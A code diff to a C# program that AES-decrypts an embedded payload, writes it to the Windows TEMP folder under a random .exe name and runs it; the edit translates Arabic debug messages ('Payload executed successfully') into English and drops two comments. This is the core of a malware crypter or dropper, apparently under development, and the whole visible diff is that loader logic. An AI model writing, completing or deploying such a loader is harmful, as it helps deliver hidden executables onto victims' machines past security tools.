@@ -14,7 +14,7 @@ class Program
     {
         try
         {
-            MessageBox.Show("1. بدأ فك التشفير...");
+            MessageBox.Show("1. Starting decryption...");
 
             using (Aes aesAlg = Aes.Create())
             {
@@ -31,15 +31,13 @@ class Program
                             csDecrypt.CopyTo(msOutput);
                             byte[] decryptedBytes = msOutput.ToArray();
                             
-                            MessageBox.Show("2. تم فك التشفير. حجم البايلود: " + decryptedBytes.Length + " بايت");
+                            MessageBox.Show("2. Decryption successful. Payload size: " + decryptedBytes.Length + " bytes");
 
-                            // كتابة البايلود في مجلد TEMP باسم عشوائي
                             string tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
                             File.WriteAllBytes(tempPath, decryptedBytes);
 
-                            MessageBox.Show("3. تم كتابة البايلود في: " + tempPath);
+                            MessageBox.Show("3. Payload written to: " + tempPath);
 
-                            // تشغيل البايلود
                             ProcessStartInfo psi = new ProcessStartInfo();
                             psi.FileName = tempPath;
                             psi.UseShellExecute = false;
@@ -47,7 +45,7 @@ class Program
                             
                             Process.Start(psi);
                             
-                            MessageBox.Show("4. تم تشغيل البايلود بنجاح.");
+                            MessageBox.Show("4. Payload executed successfully.");
                         }
                     }
                 }
@@ -55,7 +53,7 @@ class Program
         }
         catch (Exception ex)
         {
-            MessageBox.Show("خطأ: " + ex.Message);
+            MessageBox.Show("Error: " + ex.Message);
         }
     }
 }
